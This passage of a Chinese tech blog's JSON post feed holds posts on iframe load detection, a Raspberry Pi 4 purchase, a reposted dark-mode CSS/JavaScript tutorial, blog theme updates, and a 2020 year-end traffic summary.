class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 